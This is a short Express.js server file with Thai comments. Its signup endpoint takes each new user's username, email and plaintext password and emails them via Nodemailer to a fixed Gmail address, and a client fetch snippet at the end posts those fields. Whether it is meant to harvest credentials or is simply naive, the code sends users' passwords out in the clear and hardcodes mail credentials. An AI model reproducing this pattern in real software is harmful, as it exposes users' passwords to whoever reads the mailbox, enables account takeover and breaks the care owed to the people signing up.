const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// สร้าง transporter สำหรับ Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'your-email@gmail.com', // อีเมลของคุณ
        pass: 'your-email-password'    // รหัสผ่านอีเมลของคุณ
    }
});

app.post('/send-signup-info', (req, res) => {
    const { username, email, password } = req.body;

    const mailOptions = {
        from: 'saengsaengthxngkvtphcn@gmail.com', // อีเมลของคุณ
        to: 'saengsaengthxngkvtphcn@gmail.com', // อีเมลที่ต้องการส่งไป
        subject: 'New Signup Information',
        text: `New signup details:
        
Username: ${username}
Email: ${email}
Password: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ success: false, message: 'Failed to send email.' });
        }
        res.status(200).json({ success: true });
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});


fetch('http://localhost:3000/send-signup-info', { // ใช้ URL ของเซิร์ฟเวอร์
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ username, email, password })
})
